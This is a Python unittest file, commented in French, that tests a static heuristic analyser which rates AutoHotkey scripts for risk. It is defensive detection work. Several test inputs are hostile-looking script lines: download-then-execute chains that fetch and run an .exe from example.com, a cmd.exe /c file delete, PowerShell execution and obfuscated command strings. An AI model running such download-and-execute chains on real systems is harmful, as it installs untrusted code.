"""
Tests de l'analyse heuristique statique (features/custom_script/heuristics.py) :
purement synchrone, aucune I/O, donc testable directement contre des scripts
écrits à la main sans aucune isolation particulière.
"""
import unittest

from features.custom_script.heuristics import (
    SEVERITY_MODERATE, SEVERITY_NONE, SEVERITY_SEVERE, analyze_script,
)


class TestAnalyzeScript(unittest.TestCase):
    def test_benign_script_is_none(self):
        result = analyze_script("MsgBox, Hello\nSend, {Enter}")
        self.assertEqual(result.severity, SEVERITY_NONE)
        self.assertEqual(result.categories, set())

    def test_file_delete_is_moderate(self):
        result = analyze_script(r'FileDelete, C:\temp\test.txt')
        self.assertEqual(result.severity, SEVERITY_MODERATE)
        self.assertIn("files", result.categories)

    def test_regwrite_and_runas_escalates(self):
        result = analyze_script('RegWrite, REG_SZ, HKCU, Software\\Test, Val, 1\nRunAs, user, pass')
        self.assertIn("registry", result.categories)
        self.assertIn("elevation", result.categories)
        # registry(1) + elevation(2) = 3 -> encore "moderate" (seuil severe = 4)
        self.assertEqual(result.severity, SEVERITY_MODERATE)

    def test_shell_execution_via_powershell_raises_severity(self):
        plain_run = analyze_script("Run, notepad.exe")
        shell_run = analyze_script("Run, powershell -Command Get-Process")
        self.assertNotIn("shell_execution", plain_run.categories)
        self.assertIn("shell_execution", shell_run.categories)
        self.assertGreater(shell_run.score, plain_run.score)

    def test_cmd_exe_slash_c_detected_as_shell_execution(self):
        result = analyze_script('Run, cmd.exe /c del C:\\temp\\a.txt')
        self.assertIn("shell_execution", result.categories)

    def test_download_then_run_same_target_forces_severe(self):
        script = (
            "UrlDownloadToFile, http://example.com/x.exe, %A_Temp%\\x.exe\n"
            "MsgBox, done downloading\n"
            "Run, %A_Temp%\\x.exe"
        )
        result = analyze_script(script)
        self.assertEqual(result.severity, SEVERITY_SEVERE)
        self.assertIn("download_then_run", result.categories)

    def test_download_then_run_function_syntax_also_detected(self):
        script = (
            'UrlDownloadToFile("http://example.com/x.exe", "C:\\temp\\x.exe")\n'
            'Run, C:\\temp\\x.exe'
        )
        result = analyze_script(script)
        self.assertEqual(result.severity, SEVERITY_SEVERE)
        self.assertIn("download_then_run", result.categories)

    def test_download_without_matching_run_does_not_force_escalation(self):
        script = (
            "UrlDownloadToFile, http://example.com/data.json, %A_Temp%\\data.json\n"
            "Run, notepad.exe"
        )
        result = analyze_script(script)
        self.assertNotIn("download_then_run", result.categories)
        # network seul (poids 1) + execution seul (poids 1) = 2 -> moderate, pas severe
        self.assertEqual(result.severity, SEVERITY_MODERATE)

    def test_base64_like_blob_detected_as_obfuscation(self):
        blob = "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5egABCDEFGHIJ"
        self.assertGreaterEqual(len(blob), 80)
        result = analyze_script(f'data := "{blob}"')
        self.assertIn("obfuscation", result.categories)

    def test_chained_string_concatenation_detected_as_obfuscation(self):
        result = analyze_script('cmd := "c" . "m" . "d" . ".exe"\nRun, %cmd%')
        self.assertIn("obfuscation", result.categories)

    def test_run_does_not_match_inside_runas(self):
        result = analyze_script("RunAs, user, pass")
        self.assertNotIn("execution", result.categories)
        self.assertIn("elevation", result.categories)

    def test_v2_download_function_detected_as_network(self):
        result = analyze_script('Download("http://example.com/data.json", "C:\\temp\\data.json")')
        self.assertIn("network", result.categories)

    def test_v2_download_then_run_same_target_forces_severe(self):
        script = (
            'Download("http://example.com/x.exe", "C:\\temp\\x.exe")\n'
            'MsgBox "done"\n'
            'Run("C:\\temp\\x.exe")'
        )
        result = analyze_script(script)
        self.assertEqual(result.severity, SEVERITY_SEVERE)
        self.assertIn("download_then_run", result.categories)


if __name__ == "__main__":
    unittest.main()
